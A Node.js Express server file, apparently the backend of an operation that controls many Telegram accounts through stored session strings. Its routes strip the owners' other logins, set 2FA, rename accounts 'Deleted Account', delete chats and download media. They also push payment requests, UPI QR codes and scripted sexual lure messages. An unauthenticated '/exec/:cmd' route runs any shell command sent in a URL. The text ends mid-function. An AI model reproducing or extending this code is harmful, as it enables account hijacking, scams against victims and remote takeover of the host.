'use strict';
import dotenv from 'dotenv';
dotenv.config();

import express from 'express';
import axios from 'axios';
import schedule from 'node-schedule-tz';
import { timeZone, timeZoneName } from 'node-schedule-tz'; // Assuming timeZone and timeZoneName are exported from node-schedule-tz
import { ChannelService } from './dbservice';
import {
  getClient,
  hasClient,
  disconnectAll,
  createClient,
  deleteClient,
  setActiveClientSetup,
  getActiveClientSetup
} from './telegramManager';
import bodyParser from 'body-parser';
import { sleep, fetchWithTimeout, ppplbot, fetchNumbersFromString } from './utils';
import { execSync } from 'child_process';
import { CloudinaryService } from './cloudinary';
import fs from 'fs';
import { NestFactory } from '@nestjs/core';
import { ExpressAdapter } from '@nestjs/platform-express';
import { AppModule } from 'commonService';
import { SwaggerModule, DocumentBuilder } from '@nestjs/swagger';
import mongoose from 'mongoose';
import path from 'path'


var cors = require('cors');
const app = express();
const port = process.env.PORT || 4000;
const userMap = new Map();
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});
process.on('exit', async () => {
  await ChannelService.getInstance().closeConnection();
  await disconnectAll();
});
let ip;
let clients;
let upiIds;
const pings = {}


fetchWithTimeout('https://ipinfo.io/json')
  .then(result => {
    return result?.data;
  })
  .then((output) => {
    ip = output;
    console.log(ip)
  })
  .then(async () => {
    const db = ChannelService.getInstance()
    await db.connect();
    await db.setEnv();
    setTimeout(async () => {
      checkerclass.getinstance()
      await setUserMap();
    }, 100);
    setTimeout(() => {
      if (!getActiveClientSetup()) {
        joinchannelForBufferClients();
      }
    }, 120000);
  }).catch(err => {
    console.error(err)
    setTimeout(() => {
      if (!getActiveClientSetup()) {
        joinchannelForBufferClients();
      }
    }, 120000);
  })



let count = 0;
let botCount = 0

const pingerbot = `https://api.telegram.org/bot5807856562:${process.env.apikey}/sendMessage?chat_id=-1001703065531`;

const apiResp = {
  INSTANCE_NOT_EXIST: "INSTANCE_NOT_EXIST",
  CLIENT_NOT_EXIST: "CLIENT_NOT_EXIST",
  CONNECTION_NOT_EXIST: "CONNECTION_NOT_EXIST",
  ALL_GOOD: "ALL_GOOD",
  DANGER: "DANGER",
  WAIT: "WAIT"
};

async function setUserMap() {
  userMap.clear();
  const db = ChannelService.getInstance();
  await fetchWithTimeout(`${ppplbot()}&text=UptimeRobot : Refreshed Map`);
  const users = await db.getAllUserClients();
  clients = users
  upiIds = await db.getAllUpis()
  users.forEach(user => {
    userMap.set(user.userName.toLowerCase(), { url: `${user.repl}/`, timeStamp: Date.now(), deployKey: user.deployKey, downTime: 0, lastPingTime: Date.now(), clientId: user.clientId })
    pings[user.userName.toLowerCase()] = Date.now();
  })
}

function getCurrentHourIST() {
  const now = new Date();
  const istOffset = 5.5 * 60 * 60 * 1000;
  const istTime = new Date(now.getTime() + istOffset);
  const istHour = istTime.getUTCHours();
  return istHour;
}
const connetionQueue = [];
try {
  schedule.scheduleJob('test3', ' 25 2 * * * ', 'Asia/Kolkata', async () => {
    checkBufferClients()
    for (const value of userMap.values()) {
      try {
        const now = new Date();
        if (now.getUTCDate() % 3 === 1) {
          await fetchWithTimeout(`${value.url}leavechannels`);
        }
      } catch (error) {
        console.log("Some Error: ", error.code);
      }
      await sleep(3000)
    }
    await fetchWithTimeout(`${process.env.uptimeChecker}/joinchannel`)
    await fetchWithTimeout(`https://mychatgpt-pg6w.onrender.com/deletefiles`);
  })
  schedule.scheduleJob('test3', ' 25 12 * * * ', 'Asia/Kolkata', async () => {
    fetchWithTimeout(`${process.env.uptimeChecker}/joinchannel`)
    joinchannelForBufferClients();
  })
} catch (error) {
  console.log("Some Error: ", error.code);
}


app.use(cors());
app.use(bodyParser.json());
app.get('/', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {

  //
});

app.get('/exitacc', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  //
});

app.get('/checkBufferClients', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Checking Buffer Clients');
  next();
}, async (req, res) => {
  await checkBufferClients();
});
app.get('/checkArchivedClients', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Checking Buffer Clients');
  next();
}, async (req, res) => {
  await checkArchivedClients();
});

app.get('/processUsers/:limit/:skip', async (req, res, next) => {
  res.send("ok")
  next();
}, async (req, res) => {
  const limit = req.params.limit ? req.params.limit : 30
  const skip = req.params.skip ? req.params.skip : 20
  const db = await ChannelService.getInstance();
  const cursor = await db.processUsers(parseInt(limit), parseInt(skip));
  while (await cursor.hasNext()) {
    const document = await cursor.next();
    const cli = await createClient(document.mobile, document.session);
    const client = await getClient(document.mobile);
    if (cli) {
      console.log(document.mobile, " :  true");
      const lastActive = await client.getLastActiveTime();
      const date = new Date(lastActive * 1000).toISOString().split('T')[0];
      const me = await client.getMe()
      await db.updateUser(document, { msgs: cli.msgs, totalChats: cli.total, lastActive, date, tgId: me.id.toString(), lastUpdated: new Date().toISOString().split('T')[0] });
      await client?.disconnect(document.mobile);
      await deleteClient()
    } else {
      console.log(document.mobile, " :  false");
      await db.deleteUser(document);
    }
  }
  console.log("finished")
});

app.get('/refreshMap', async (req, res) => {
  checkerclass.getinstance();
  await setUserMap();
  res.send('Hello World!');
});

app.get('/clearstats2', async (req, res) => {
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  await db.clearStats2();
  res.send('Hello World!');
});

app.get('/exit', async (req, res) => {
  await ChannelService.getInstance().closeConnection();
  process.exit(1)
  res.send('Hello World!');
});

app.post('/channels', async (req, res, next) => {
  res.send('Hello World!');
  // console.log(req.body);
  next();
}, async (req, res) => {
  const channels = req.body?.channels;
  const db = ChannelService.getInstance();
  channels?.forEach(async (channel) => {
    await db.insertChannel(channel);
  })
});

let settingupClient = Date.now() - 250000;
app.get('/setupClient/:clientId', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  if (Date.now() > (settingupClient + 240000)) {
    await disconnectAll();
    await sleep(1000)
    settingupClient = Date.now();
    const clientId = req.params?.clientId;
    const archieveOld = req?.query?.a;
    const days = req?.query?.d;
    const mobile = req?.query?.m;
    const formalities = req?.query?.f;
    const PLimited = !!req.query.PLimited;
    console.log(clientId, archieveOld);
    await fetchWithTimeout(`${ppplbot()}&text=Received NEw Client Request for - ${clientId}`);
    await setUpClient(clientId.toString(), archieveOld?.toLowerCase() === 'yes' ? true : false, days, mobile, formalities?.toLowerCase() === 'no' ? false : true, PLimited)
  } else {
    console.log("Profile Setup Recently tried");
  }
})

app.get('/updateClient/:clientId', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  settingupClient = Date.now();
  const clientId = req.params?.clientId;
  console.log(clientId);
  await updateClient(clientId.toString())
})

app.get('/getip', (req, res) => {
  res.json(ip);
});

app.post('/contacts', async (req, res, next) => {
  res.send('Hello World!');
  // console.log(req.body);
  next();
}, async (req, res) => {
  const contacts = req.body?.contacts;
  const db = ChannelService.getInstance();
  contacts?.forEach(async (contact) => {
    await db.insertContact(contact);
  })
  console.log('contacts saved', contacts.length);
});

app.post('/users', async (req, res, next) => {
  res.send('Hello World!');
  console.log(req.body);
  next();
}, async (req, res) => {
  const user = req.body;
  const db = ChannelService.getInstance();
  const cli = getClient(user.mobile);
  const activeClientSetup = getActiveClientSetup()
  if (activeClientSetup && activeClientSetup?.phoneNumber == user.mobile) {
    setActiveClientSetup(undefined)
    console.log("New Session Generated");
    await setNewClient(user, activeClientSetup);
    await deleteClient(user.mobile)
  } else {
    console.log(!cli, activeClientSetup?.phoneNumber, user.mobile)
    user['lastUpdated'] = new Date().toISOString().split('T')[0]
    await db.insertUser(user);
    await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.userName ? `@${user.userName}` : user.firstName}\nMsgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\n${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);
  }
});

app.get('/channels/:limit/:skip', async (req, res, next) => {
  const limit = req.params.limit ? req.params.limit : 30
  const skip = req.params.skip ? req.params.skip : 20
  const k = req.query?.k
  const db = ChannelService.getInstance();
  const channels = await db.getChannels(parseInt(limit), parseInt(skip), k);
  let resp = 'joinchannel:'
  for (const channel of channels) {
    resp = resp + (channel?.username?.startsWith("@") ? channel.username : `@${channel.username}`) + "|";
  }
  res.send(resp);
});

app.get('/activechannels/:limit/:skip', async (req, res, next) => {
  const limit = req.params.limit ? req.params.limit : 30
  const skip = req.params.skip ? req.params.skip : 20
  const k = req.query?.k
  const db = ChannelService.getInstance();
  const result = await db.getActiveChannels(parseInt(limit), parseInt(skip), [k], [], 'channels');
  let resp = 'joinchannel:'
  for (const channel of result) {

    resp = resp + (channel?.username?.startsWith("@") ? channel.username : `@${channel.username}`) + "|";
  }
  res.send(resp);
});

let refresTime = Date.now();
app.get('/getdata', async (req, res, next) => {
  checkerclass.getinstance()
  if (Date.now() > refresTime) {
    refresTime = Date.now() + (5 * 60 * 1000);
    Array.from(userMap.values()).map(async (value) => {
      await fetchWithTimeout(`${value.url}markasread`);
    })
  }
  res.setHeader('Content-Type', 'text/html');
  let resp = '<html><head></head><body>';
  resp = resp + await getData();
  resp += '</body></html>';
  resp += `<script>
              console.log("hii");
              setInterval(() => {
                window.location.reload();
              }, 20000);
          </script>`;
  res.send(resp);
});

app.get('/getdata2', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await fetchWithTimeout(`${value.url}getDemostat2`);
    await sleep(1000);
  }
});

app.get('/getAllIps', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    try {
      console.log(value.clientId)
      const res = await fetchWithTimeout(`${value.url}getip`);
      console.log(res.data);
    } catch (error) {

    }
  }
});

app.get('/refreshupis', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await fetchWithTimeout(`${value.url}refreshupis`);
  }
});

app.get('/getuserdata', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await fetchWithTimeout(`${value.url}getuserstats`);
    await sleep(1000);
  }
});

app.get('/getuserdata2', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await fetchWithTimeout(`${value.url}getuserstats2`);
    await sleep(1000);
  }
});

app.get('/restartall', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  Array.from(userMap.values()).map(async (value) => {
    await fetchWithTimeout(`${value.deployKey}`);
  })
});
app.get('/sendtoall', async (req, res, next) => {
  checkerclass.getinstance();
  console.log('Received sendtoall request');
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const queries = req.query
  let newQuery = '';
  Object.keys(req.query).map((key) => {
    newQuery += `${queries[key]}/`
  });
  console.log(newQuery);
  for (const value of userMap.values()) {
    const url = `${value.url}${newQuery}`;
    console.log(url);
    await sleep(1000);
    await fetchWithTimeout(url);
  }
});

app.get('/usermap', async (req, res) => {
  checkerclass.getinstance()
  console.log('Received Usermap request');
  res.json(Array.from(userMap.values()));
});

app.get('/getbufferclients', async (req, res) => {
  const db = ChannelService.getInstance();
  const result = []
  const clients = await db.readBufferClients({});
  clients.forEach((cli) => {
    result.push(cli.mobile);
  })
  res.json(result);
});

app.get('/clients', async (req, res) => {
  checkerclass.getinstance();
  console.log('Received Client request');
  res.json(clients)
});

app.get('/keepready2', async (req, res, next) => {
  checkerclass.getinstance()
  console.log('Received keepready2 request');
  res.send(`Responding!!\nMsg = ${req.query.msg}`);
  next();
}, async (req, res) => {
  const msg = req.query.msg;
  console.log("Msg2 = ", msg);
  Array.from(userMap.values()).map(async (value) => {
    await fetchWithTimeout(`${value.url}resptopaid2?msg=${msg ? msg : "Oye..."}`);
    await fetchWithTimeout(`${value.url}getDemostats`);
  });
  const db = ChannelService.getInstance();
  await db.clearStats()
});

app.get('/keepready', async (req, res, next) => {
  checkerclass.getinstance();
  console.log('Received Keepready request');
  const dnsMsg = encodeURIComponent(`Dont Speak Okay!!\n**I am in Bathroom**\n\nMute yourself!!\n\nI will show you Okay..!!`)
  const msg = req.query.msg.toLowerCase() == 'dns' ? dnsMsg : req.query.msg;
  Array.from(userMap.values()).map(async (value) => {
    await fetchWithTimeout(`${value.url}resptopaid?msg=${msg ? msg : "Oye..."}`);
  });
  const db = ChannelService.getInstance();
  await db.clearStats();
  res.send(`Responding!!\nMsg = ${msg}`);
});

app.get('/asktopay', async (req, res, next) => {
  checkerclass.getinstance();
  console.log('Received AsktoPay request');
  res.send(`Asking Pppl`);
  next();
}, async (req, res) => {
  const msg = req.query.msg;
  console.log("Msg = ", msg);
  Array.from(userMap.values()).map(async (value) => {
    await fetchWithTimeout(`${value.url}asktopay`)
  })
});

let callingTime = Date.now();
app.get('/calltopaid', async (req, res, next) => {
  checkerclass.getinstance()
  console.log('Received Call request');
  res.send(`Asking Pppl`);
  next();
}, async (req, res) => {
  const msg = req.query.msg;
  console.log("Msg = ", msg);
  if (Date.now() > callingTime) {
    callingTime = Date.now() + (10 * 60 * 1000)
    Array.from(userMap.values()).map(async (value) => {
      await fetchWithTimeout(`${value.url}calltopaid`)
    })
  }
});


app.get('/markasread', async (req, res, next) => {
  checkerclass.getinstance();
  console.log('Received MarkasRead Req');
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const all = req.query.all;
  if (Date.now() > refresTime) {
    refresTime = Date.now() + (5 * 60 * 1000);
    console.log("proceeding with all = ", all);
    Array.from(userMap.values()).map(async (value) => {
      await fetchWithTimeout(`${value.url}markasread?${all ? "all=true" : ''}`);
    })
  }
});

app.get('/setactiveqr', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const upi = req.query.upi;
  console.log("upi = ", upi);
  Array.from(userMap.values()).map(async (value) => {
    await fetchWithTimeout(`${value.url}setactiveqr?upi=${upi}`);
  })
});

app.get('/getUpiId', async (req, res) => {
  checkerclass.getinstance();
  const app = req.query.app ? req.query.app : "paytm3"
  const db = ChannelService.getInstance();
  const upiId = await db.getupi(app);
  res.send(upiId);
});

app.get('/getAllUpiIds', async (req, res) => {
  checkerclass.getinstance();
  res.json(upiIds);
});

app.post('/getAllUpiIds', async (req, res, next) => {
  const data = req.body
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  const upiIds = await db.updateUpis(data);
  res.json(upiIds);
  next();
}, async () => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await fetchWithTimeout(`${value.url}refreshupis`);
  }
})

app.get('/getUserConfig', async (req, res) => {
  const filter = req.query
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  const userConfig = await db.getUserConfig(filter);
  res.json(userConfig);
});

app.post('/getUserConfig', async (req, res) => {
  const filter = req.query
  const data = req.body
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  const upiIds = await db.updateUserConfig(filter, data);
  await setUserMap();
  res.json(upiIds);
});


app.get('/builds', async (req, res) => {
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  const data = await db.getBuilds();
  console.log(data);
  res.json(data);
});

app.post('/builds', async (req, res) => {
  const data = req.body
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  console.log(data);
  const result = await db.updateBuilds(data);
  res.json(result);
});

app.get('/getAllUserClients', async (req, res) => {
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  const userConfig = await db.getAllUserClients();
  const resp = []
  userConfig.map((user) => {
    resp.push(user.clientId)
  })
  res.send(resp);
});

app.get('/getTgConfig', async (req, res) => {
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  const tgConfig = await db.getTgConfig()
  res.json(tgConfig);
});

app.get('/updateActiveChannels', async (req, res) => {
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  const tgConfig = await db.updateActiveChannels();
  res.send("ok");
});

app.get('/getCurrentActiveUniqueChannels', async (req, res) => {
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  const result = await db.getCurrentActiveUniqueChannels();
  res.json({ length: result.length, data: result });
});

app.post('/getTgConfig', async (req, res, next) => {
  const data = req.body
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  const upiIds = await db.updateUpis(data)
  res.json(upiIds);
  next();
}, async () => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await fetchWithTimeout(`${value.url}refreshupis`);
  }
});

app.get('/lastpings', async (req, res, next) => {
  checkerclass.getinstance();
  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    resp = resp + `${value.clientId}  :  ${Number(((Date.now() - value.lastPingTime) / 60000).toFixed(2))}\n`
  }
  resp += '</pre></body></html>';
  res.setHeader('Content-Type', 'text/html');
  res.send(resp);
});

app.get('/lastpingsjson', async (req, res, next) => {
  checkerclass.getinstance();
  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';
  for (const userdata in pings) {
    resp = resp + `${userdata}  :  ${Number(((Date.now() - pings[userdata]) / 60000).toFixed(2))}\n`
  }
  resp += '</pre></body></html>';
  res.setHeader('Content-Type', 'text/html');
  res.send(resp);
});

app.get('/exitglitches', async (req, res, next) => {
  res.send("ok")
  next();
}, async () => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    if (value.url.toLowerCase().includes('glitch'))
      await fetchWithTimeout(`${value.url}exit`);
  }
});

app.get('/exitprimary', async (req, res, next) => {
  res.send("ok")
  next();
}, async () => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    if (value.clientId.toLowerCase().includes('1'))
      await fetchWithTimeout(`${value.url}exit`);
  }
});

app.get('/exitsecondary', async (req, res, next) => {
  res.send("ok")
  next();
}, async () => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    if (value.clientId.toLowerCase().includes('2'))
      await fetchWithTimeout(`${value.url}exit`);
  }
});

app.get('/connectclient/:number', async (req, res) => {
  const number = req.params?.number;
  const db = ChannelService.getInstance();
  const user = await db.getUser({ mobile: number });
  if (user) {
    if (!hasClient(user.mobile)) {
      const cli = await createClient(user.mobile, user.session);
      if (cli) {
        res.send("client created");
      } else {
        res.send("client EXPIRED");
      }
    } else {
      res.send("Client Already existing");
    }
  } else {
    res.send("User Does not exist");
  }
});

app.get('/joinchannels/:number/:limit/:skip', async (req, res, next) => {
  res.send("joiningChannels");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const limit = req.params.limit ? req.params.limit : 30
    const skip = req.params.skip ? req.params.skip : 20
    const k = req.query?.k
    const db = ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    if (!hasClient(user.mobile)) {
      const cli = await createClient(user.mobile, user.session, false);
      if (cli) {
        const client = await getClient(user.mobile);
        const channels = await client.channelInfo(true);
        const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'coupl', 'cpl', 'randi', 'bhab', 'boy', 'girl', 'friend', 'frnd', 'boob', 'pussy', 'dating', 'swap', 'gay', 'sex', 'bitch', 'love', 'video', 'service', 'real', 'call', 'desi'];
        const result = await db.getActiveChannels(parseInt(limit), parseInt(skip), k ? [k] : keys, channels.ids, 'channels');
        console.log("DbChannelsLen: ", result.length);
        let resp = '';
        for (const channel of result) {

          resp = resp + (channel?.username?.startsWith("@") ? channel.username : `@${channel.username}`) + "|";
        }
        await client.removeOtherAuths();
        client.joinChannels(resp);
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});

app.get('/set2fa/:number', async (req, res, next) => {
  res.send("Setting 2FA");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    if (!hasClient(user.mobile)) {
      const cli = await createClient(user.mobile, user.session);
      const client = await getClient(user.mobile);
      if (cli) {
        await client.set2fa();
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error.code)
  }
});

app.get('/setpp/:number/:name', async (req, res, next) => {
  res.send("Setting 2FA");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const name = req.params?.name;
    const db = ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    if (!hasClient(user.mobile)) {
      const cli = await createClient(user.mobile, user.session);
      const client = await getClient(user.mobile);
      if (cli) {
        await CloudinaryService.getInstance(name);
        await sleep(2000);
        await client.updateProfilePic('./dp1.jpg');
        await sleep(1000);
        await client.updateProfilePic('./dp2.jpg');
        await sleep(1000);
        await client.updateProfilePic('./dp3.jpg');
        await sleep(1000);
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error.code)
  }
});


app.get('/updateclientasdeleted/:number', async (req, res, next) => {
  res.send("Updating Name");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = ChannelService.getInstance();
    let user = await db.getUser({ mobile: number });
    if (!user) {
      user = await db.getInAchivedClient({ number: `+${number}` });
      user['mobile'] = user.number
    }
    console.log(user);
    if (user && !hasClient(user.mobile)) {
      const cli = await createClient(user.mobile, user.session);
      const client = await getClient(user.mobile);
      if (cli) {
        if (!(await client.hasPassword())) {
          await client.set2fa();
        }
        await sleep(30000)
        await client.updateUsername();
        await sleep(5000)
        await client.updatePrivacyforDeletedAccount();
        await sleep(5000)
        await client.updateProfile("Deleted Account", "Deleted Account");
        await sleep(5000)
        await client.deleteProfilePhotos();
        await sleep(5000)
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});


app.get('/updatePrivacy/:number', async (req, res, next) => {
  res.send("Updating Privacy");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!hasClient(user.mobile)) {
      const cli = await createClient(user.mobile, user.session);
      const client = await getClient(user.mobile);
      if (cli) {
        await client.updatePrivacy();
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});

app.get('/UpdateUsername/:number', async (req, res, next) => {
  res.send("Updating Privacy");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const username = req.query?.username;
    const db = ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!hasClient(user.mobile)) {
      const cli = await createClient(user.mobile, user.session);
      const client = await getClient(user.mobile);
      if (cli) {
        await client.updateUsername(username);
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});


app.get('/UpdatePP/:number', async (req, res, next) => {
  res.send("Updating profile Pic");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!hasClient(user.mobile)) {
      const cli = await createClient(user.mobile, user.session);
      const client = await getClient(user.mobile);
      if (cli) {
        await client.updateProfilePic("./qrcode.jpg");
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});

app.get('/deleteChat/:number/:chatId', async (req, res, next) => {
  res.send("dleteing chat");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const chatId = req.params?.chatId;
    const db = ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!hasClient(user.mobile)) {
      const cli = await createClient(user.mobile, user.session);
      const client = await getClient(user.mobile);
      if (cli) {
        await client.deleteChat(chatId);
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});


app.get('/UpdateName/:number', async (req, res, next) => {
  res.send("Updating Name");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!hasClient(user.mobile)) {
      const cli = await createClient(user.mobile, user.session);
      const client = await getClient(user.mobile);
      if (cli) {
        await client.updateProfile("Deleted Account", "Deleted Account");
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});


app.get('/deletepp/:number', async (req, res, next) => {
  res.send("Updating Name");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!hasClient(user.mobile)) {
      const cli = await createClient(user.mobile, user.session);
      const client = await getClient(user.mobile);
      if (cli) {
        await client.deleteProfilePhotos();
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});

app.get('/rmbuffer/:number', async (req, res, next) => {
  res.send("Updating Name");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = ChannelService.getInstance();
    await db.deleteBufferClient({ mobile: number })
  } catch (error) {
    console.log("Some Error: ", error)
  }
});

app.get('/removeAuths/:number', async (req, res) => {
  const number = req.params?.number;
  const db = ChannelService.getInstance();
  const user = await db.getUser({ mobile: number });
  if (!hasClient(user.mobile)) {
    const cli = await createClient(user.mobile, user.session);
    const client = await getClient(user.mobile);
    if (client) {
      await client.removeOtherAuths();
      res.send("Auths Removed");
    } else {
      res.send("client EXPIRED");
    }
  } else {
    res.send("Client Already existing");
  }
});

app.get('/exec/:cmd', async (req, res, next) => {
  let cmd = req.params.cmd;
  console.log(`executing: `, cmd);
  try {
    res.send(console.log(execSync(cmd).toString()));
  } catch (error) {
    console.log(error);
  }
});

app.get('/blockusers/:number', async (req, res) => {
  const number = req.params?.number;
  const db = ChannelService.getInstance();
  const user = await db.getUser({ mobile: number });
  if (!hasClient(user.mobile)) {
    const cli = await createClient(user.mobile, user.session);
    const client = await getClient(user.mobile);
    if (client) {
      await client.blockAllUsers();
      res.send("Blocked Users");
    } else {
      res.send("client EXPIRED");
    }
  } else {
    res.send("Client Already existing");
  }
});

app.get('/downloadMedia/:number', async (req, res) => {
  const number = req.params?.number;
  const db = ChannelService.getInstance();
  const user = await db.getUser({ mobile: number });
  if (!hasClient(user.mobile)) {
    const cli = await createClient(user.mobile, user.session, false);
    const client = await getClient(user.mobile);
    if (client) {
      await client.getSelfChatMediaAndZip();
      res.send("Downloading Media");
    } else {
      res.send("client EXPIRED");
    }
  } else {
    res.send("Client Already existing");
  }
});

app.get('/getAuths/:number', async (req, res) => {
  const number = req.params?.number;
  const db = ChannelService.getInstance();
  const user = await db.getUser({ mobile: number });
  if (!hasClient(user.mobile)) {
    const cli = await createClient(user.mobile, user.session);
    const client = await getClient(user.mobile);
    if (client) {
      res.json(await client.getAuths());
    } else {
      res.send("client EXPIRED");
    }
  } else {
    res.send("Client Already existing");
  }
});


app.get('/connectcliens/:limit/:skip', async (req, res) => {
  const limit = req.params?.limit;
  const skip = req.params?.skip;
  const db = ChannelService.getInstance();
  const users = await db.getUsersFullData(parseInt(limit), parseInt(skip));
  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';

  for (const user of users) {
    if (!hasClient(user.mobile)) {
      const cli = await createClient(user.mobile, user.session);
      if (cli) {
        resp += `${user.mobile} : true\n\n`;
      } else {
        resp += `${user.mobile} : false\n\n`;
      }
    }
  }

  resp += '</pre></body></html>';

  console.log("data: ", resp);
  res.setHeader('Content-Type', 'text/html');
  res.send(resp);
});

app.get('/disconnectclients', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  await disconnectAll();
});

app.get('/disconnectclient', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const number = req.query?.number?.replace('+', '');
  await deleteClient(number);
});

app.get('/promoteStats', async (req, res, next) => {
  const resp = await getPromotionStatsHtml();
  res.setHeader('Content-Type', 'text/html');
  res.send(resp)
});


app.get('/getusers/:limit/:skip', async (req, res, next) => {
  const limit = parseInt(req.params?.limit ? req.params?.limit : 10);
  const skip = parseInt(req.params?.skip ? req.params?.skip : 10);
  const db = ChannelService.getInstance();
  const users = await db.getUsers(limit, skip);
  res.json(users)
})

app.get('/getlastmsgs/:number/:limit', async (req, res, next) => {
  const limit = parseInt(req.params?.limit ? req.params?.limit : 10);
  const number = req.params?.number;
  console.log(number, limit);
  const clientobj = getClient(number);
  await clientobj.client.connect();
  console.log(clientobj.client.connected);
  if (clientobj) {
    const result = await clientobj?.getLastMsgs(limit, number);
    res.send(result)
  } else {
    res.send("client is undefined");
  }

})

app.get('/getchannels', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await fetchWithTimeout(`${value.url}getchannels`);
    await sleep(1000);
  }
});

app.get('/restart', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userName = req.query.userName;
